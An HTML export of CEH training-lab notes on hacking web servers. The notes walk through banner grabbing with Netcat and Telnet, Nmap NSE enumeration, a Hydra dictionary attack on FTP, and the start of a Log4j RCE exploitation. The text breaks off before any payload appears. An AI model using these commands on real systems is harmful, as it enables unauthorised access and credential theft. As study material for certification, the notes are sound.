@@ -1,0 +1,729 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CEH Lab - Mod13 - Hacking Web Servers</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(134, 131, 126, 1);
+	fill: rgba(134, 131, 126, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(63, 126, 190, 1);
+	fill: rgba(63, 126, 190, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 111, 200, 0.09);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(134, 131, 126, 1);
+	fill: rgba(134, 131, 126, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(63, 126, 190, 1);
+	fill: rgba(63, 126, 190, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(232, 242, 250, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 99, 174, 0.172); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2643addf-00cb-8039-b2f0-d571b168e579" class="page sans"><header><h1 class="page-title">CEH Lab - Mod13 - Hacking Web Servers</h1><p class="page-description"></p></header><div class="page-body"><p id="2643addf-00cb-8004-8681-d286b8f0bace" class="">
+</p><h3 id="2643addf-00cb-8053-aab5-c769f8f38595" class="">Lab Objectives: </h3><p id="2643addf-00cb-800b-a086-e18bc4167f49" class="">▪ Footprint a web server using various information-gathering tools and inbuilt commands </p><p id="2643addf-00cb-80ae-b7fb-ec88652d79f1" class="">▪ Enumerate web server information </p><p id="2643addf-00cb-80fb-9534-e1462e9136d1" class="">▪ Crack remote passwords<br/></p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 1: Footprint the Web Server </summary><div class="indented"><h3 id="2643addf-00cb-8022-bcf3-e26d499d80f3" class="">Lab Objectives</h3><p id="2643addf-00cb-8072-8504-f5b95c8eef25" class="">▪ Footprint a web server using Netcat and Telnet </p><p id="2643addf-00cb-8032-8f60-e396f49c56c0" class="">▪ Enumerate web server information using Nmap Scripting Engine (NSE)<br/></p><h3 id="2643addf-00cb-80c6-8b5a-e177887cff7a" class="">Task 1: Footprint a Web Server using Netcat and Telnet </h3><p id="2643addf-00cb-80d6-85fd-de6d733495dd" class="">
+</p><p id="2643addf-00cb-80e7-b599-eabbd6620324" class=""><strong>Netcat</strong><br/>Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol. It is a reliable “back-end” tool used directly or driven by other programs and scripts. It is also a network debugging and exploration tool. </p><p id="2643addf-00cb-806c-9454-e32494ed7697" class="">
+</p><p id="2643addf-00cb-80a4-b0a8-f336bfb871c2" class=""><strong>Telnet </strong></p><p id="2643addf-00cb-8015-883e-de02297d05cb" class="">Telnet is a client-server network protocol. It is widely used on the Internet or LANs. It provides the login session for a user on the Internet.</p><p id="2643addf-00cb-8030-b619-e4cc250ac441" class="">
+</p><p id="2643addf-00cb-80f6-91b9-dc7b6e272fe2" class="">The primary security problems with Telnet are the following:</p><p id="2643addf-00cb-80a9-bd02-f555c3656743" class="">▪ It does not encrypt any data sent through the connection.</p><p id="2643addf-00cb-80ff-aaab-f6152b432dcd" class="">▪ It lacks an authentication scheme.</p><p id="2643addf-00cb-8062-b38a-db69f7ca74d5" class="">
+</p><p id="2643addf-00cb-8091-b007-ee2eb3b2cb0d" class="">Telnet helps users perform<strong> banner-grabbing attacks.</strong> It <strong>probes HTTP servers</strong> to determine the <strong>Server field in the HTTP response header</strong></p><p id="2643addf-00cb-8073-b60a-fa6e728ee7d6" class=""><br/>In Parrot security machine: </p><ol type="1" id="2643addf-00cb-80df-b251-d1279eaa7ecc" class="numbered-list" start="1"><li><em><strong>nc -vv www.moviescope.com 80</strong></em></li></ol><ol type="1" id="2643addf-00cb-8081-85b1-e30f2af5b47e" class="numbered-list" start="2"><li><em><strong>GET / HTTP/1.0  → Enter x2</strong></em></li></ol><p id="2643addf-00cb-8094-b74f-d6d0b7bc443d" class="">and/or</p><ol type="1" id="2643addf-00cb-80e0-93b8-e5ed6200db55" class="numbered-list" start="1"><li><em><strong>telnet </strong></em><em><strong><a href="http://www.moviescope.com">www.moviescope.com</a></strong></em><em><strong> 80</strong></em></li></ol><ol type="1" id="2643addf-00cb-80b9-bbc1-e1e6ad6c46f0" class="numbered-list" start="2"><li><em><strong>GET / HTTP/1.0  → Enter x2</strong></em></li></ol><p id="2643addf-00cb-8059-abc3-c1288c81b6d1" class="">
+</p><p id="2643addf-00cb-80b3-8661-e0e2d0efaf86" class="">
+</p><h3 id="2643addf-00cb-8035-861b-c1da9097319b" class="">Task 2: Enumerate Web Server Information using Nmap Scripting Engine (NSE)</h3><p id="2643addf-00cb-8089-afb7-d89586110dc3" class="">Utilizing Nmap and http-enum.nse content returns a diagram of those applications, registries, and records uncovered. This way, it is possible to check for vulnerabilities or abuses in databases. </p><p id="2643addf-00cb-80c9-ae14-ff5e0b355499" class="">
+</p><ol type="1" id="2643addf-00cb-8006-a1bb-e71b5b255f30" class="numbered-list" start="1"><li>Enumerate directories used by web servers/applications: <ol type="a" id="2643addf-00cb-807e-b5ae-e879fc9e7b97" class="numbered-list" start="1"><li><em><strong>nmap -sV --script=http-enum &lt;target website&gt;</strong></em></li></ol></li></ol><figure id="2643addf-00cb-80e9-aa84-e9d65c021165" class="image"><a href="image%2063.png"><img style="width:633.9732666015625px" src="image%2063.png"/></a></figure><ol type="1" id="2643addf-00cb-80a1-91cd-cd4ce290a682" class="numbered-list" start="2"><li>Discover the hostnames that resolve the targeted domain.<ol type="a" id="2643addf-00cb-802c-be17-e19412af844e" class="numbered-list" start="1"><li><em><strong>nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap-www.goodshopping.com</strong></em></li></ol></li></ol><figure id="2643addf-00cb-801c-b1e6-e4c1ae50b0b3" class="image"><a href="image%2064.png"><img style="width:621.9791870117188px" src="image%2064.png"/></a></figure><ol type="1" id="2643addf-00cb-80a9-a794-c1f997aaf4c0" class="numbered-list" start="3"><li>Perform HTTP trace on targeted domain (This script will detect a vulnerable server that uses the TRACE method by sending an HTTP TRACE request that shows if the method is enabled or not)<ol type="a" id="2643addf-00cb-809c-abbe-f37cef207fb1" class="numbered-list" start="1"><li><em><strong>nmap --script http-trace -d www.goodshopping.com</strong></em></li></ol></li></ol><ol type="1" id="2643addf-00cb-8094-b648-e817883920dd" class="numbered-list" start="4"><li>Check whether Web Application Firewall is configured on the target host or domain<ol type="a" id="2643addf-00cb-80ad-b7d3-f2dc4910c084" class="numbered-list" start="1"><li><em><strong>nmap -p80 --script http-waf-detect www.goodshopping.com</strong></em></li></ol></li></ol></div></details><p id="2643addf-00cb-808d-815a-f1b0b9766f74" class="">
+</p><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Lab 2: Perform a Web Server Attack</summary><div class="indented"><p id="2643addf-00cb-8078-a482-ee862f3fb124" class="">
+</p><h3 id="2643addf-00cb-8055-a2c3-f939eb60df3a" class="">Lab Objectives </h3><p id="2643addf-00cb-804e-8e2e-dba33a4d3f4f" class="">▪ Crack FTP credentials using a Dictionary Attack </p><p id="2643addf-00cb-803c-8e68-d7ae62c7d796" class="">▪ Gain Access to target Web Server by exploiting Log4j vulnerability<br/></p><h3 id="2643addf-00cb-8084-9c67-f503651eda0c" class="">Task 1: Crack FTP Credentials using a Dictionary Attack </h3><p id="2643addf-00cb-8050-b08c-c2eb91e536c7" class="">
+</p><p id="2643addf-00cb-8019-a552-c4fea781f86d" class="">Find open FTP port using Nmap, then perform dictionary attack using TCH Hydra Tool</p><p id="2643addf-00cb-80d7-851d-c3d2d9ba5a12" class="">(<strong>Note</strong>: Here, we will use a sample password file (Passwords.txt) containing a list of passwords to crack the FTP credentials on the target machine)</p><ol type="1" id="2643addf-00cb-8072-a74f-efd9098dc767" class="numbered-list" start="1"><li>Check if FTP port is open on target machine<ol type="a" id="2643addf-00cb-8058-b126-d6a457751ac6" class="numbered-list" start="1"><li><em><strong>nmap -p 21 &lt;target IP&gt;</strong></em></li></ol></li></ol><ol type="1" id="2643addf-00cb-808c-bdca-e34dcd76eaf5" class="numbered-list" start="2"><li>Check if FTP server is hosted on target machine<ol type="a" id="2643addf-00cb-808b-8f96-ce437776f64d" class="numbered-list" start="1"><li><em><strong>ftp &lt;target IP&gt;</strong></em></li></ol></li></ol><ol type="1" id="2643addf-00cb-8010-b914-c7e9981c0b23" class="numbered-list" start="3"><li>Perform dictionary attack using TCH Hydra tool<ol type="a" id="2643addf-00cb-80c2-a5e1-cf4f86a078f8" class="numbered-list" start="1"><li>Copy/Paste wordlist to Desktop</li></ol><ol type="a" id="2643addf-00cb-80b8-91e5-ec8d4eae02d7" class="numbered-list" start="2"><li><em><strong>hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[Target IP]</strong></em></li></ol></li></ol><ol type="1" id="2643addf-00cb-80ff-9f5b-e7d0735d017b" class="numbered-list" start="4"><li><em><strong>mkdir Hacked </strong></em> to remotely create a directory named Hacked on the target machine </li></ol><ol type="1" id="2643addf-00cb-803c-a381-cc5965b66fe5" class="numbered-list" start="5"><li>Type help in the ftp prompt to show a list of ftp commands</li></ol><p id="2643addf-00cb-8020-85b4-e1d97897ce2b" class="">
+</p><h3 id="2643addf-00cb-808e-a689-ff0d5fef8437" class="">Task 2: Gain Access to Target Web Server by Exploiting Log4j Vulnerability</h3><p id="2643addf-00cb-80e5-8c5e-e244113ddf66" class="">
+</p><p id="2643addf-00cb-809b-b07e-dbb009863e38" class=""><strong>Log4j </strong>is an open-source framework that helps developers store various types of logs produced by users. </p><p id="2643addf-00cb-8090-afcd-e1dc87695877" class="">Log4j which is also known as Log4shell and LogJam is a zero-day RCE (Remote Code Execution) vulnerability, tracked under CVE-2021–44228. </p><ul id="2643addf-00cb-80c8-b16b-ddf25c4f241e" class="bulleted-list"><li style="list-style-type:disc">Enables insecure JNDI lookups, when these JNDI lookups are paired with the LDAP protocol, can be exploited to exfiltrate data or execute arbitrary code.</li></ul><p id="2643addf-00cb-805e-8413-fb62cadeb246" class="">
+</p><ol type="1" id="2643addf-00cb-800a-8973-f1fba0d17e0a" class="numbered-list" start="1"><li>Scan target machine to identify vulnerable services running<ol type="a" id="2643addf-00cb-80c6-86cb-eab61354eb93" class="numbered-list" start="1"><li><em><strong>nmap -sV -sC 10.10.1.9 </strong></em></li></ol><ol type="a" id="2643addf-00cb-802b-9a9d-da0e473c21b4" class="numbered-list" start="2"><li><strong>Note</strong>: -sV option enables version detection. This means Nmap will try to determine the version of the services running on open ports. -sC option enables the use of default scripts in the Nmap Scripting Engine (NSE). These scripts perform various tasks like service detection, vulnerability detection, and more.</li></ol></li></ol><ol type="1" id="2643addf-00cb-8077-9566-ce7b24eaa24a" class="numbered-list" start="2"><li>Results show port 8080 open and Apache Tomcat/Coyote 1.1 server running on target system</li></ol><figure id="2643addf-00cb-8065-98cf-da7c1d7f6368" class="image"><a href="image%2065.png"><img style="width:594.9851684570312px" src="image%2065.png"/></a></figure><ol type="1" id="2643addf-00cb-8007-8a34-c9e3ff785673" class="numbered-list" start="3"><li>Upon investigation we can see that Apache is vulnerable to Remote Code Execution (RCE) attack. Now we wil use searchsploit to find the vulnerabilities pertaining to RCE attack on the target server</li></ol><ol type="1" id="2643addf-00cb-80dd-8fef-d9082a69a93e" class="numbered-list" start="4"><li>View RCE vulnerabilities on Apache server<ol type="a" id="2643addf-00cb-807c-96ac-c4e664ab5b8d" class="numbered-list" start="1"><li><em><strong>searchsploit -t Apache RCE</strong></em></li></ol></li></ol><ol type="1" id="2643addf-00cb-80cb-abf2-c4af5898b178" class="numbered-list" start="5"><li>Now, we need to select a vulnerability to exploit the Server from the list, from the Nmap scan we found that the Apache Tomcat server is running on JSP so we will target java vulnerabilities from the list of vulnerabilities.</li></ol><ol type="1" id="2643addf-00cb-8082-a2a6-c98c4629ca0a" class="numbered-list" start="6"><li>We can see that Java platform is vulnerable for <strong>Apache Log4j 2 - Remote Command Execution (RCE)</strong> exploit</li></ol><ol type="1" id="2643addf-00cb-803a-beee-e4e0aaa902e1" class="numbered-list" start="7"><li>Exploit the Log4j vulnerability<ol type="a" id="2643addf-00cb-80cb-a94d-cb912a322770" class="numbered-list" start="1"><li>Open Firefox</li></ol><ol type="a" id="2643addf-00cb-807f-a0d8-c980ec386d78" class="numbered-list" start="2"><li>http://&lt;target IP:8080&gt;</li></ol><ol type="a" id="2643addf-00cb-80f4-8386-e0fb95028caa" class="numbered-list" start="3"><li>Switch to terminal → <em><strong>cd log4j-shell-poc/ </strong></em></li></ol><ol type="a" id="2643addf-00cb-805a-8214-d43bf52f42b2" class="numbered-list" start="4"><li>Install JDK 8 (extract JDK zip file located at /home/attacker)<ol type="i" id="2643addf-00cb-801b-9473-d06108421cb0" class="numbered-list" start="1"><li>Open new terminal window</li></ol><ol type="i" 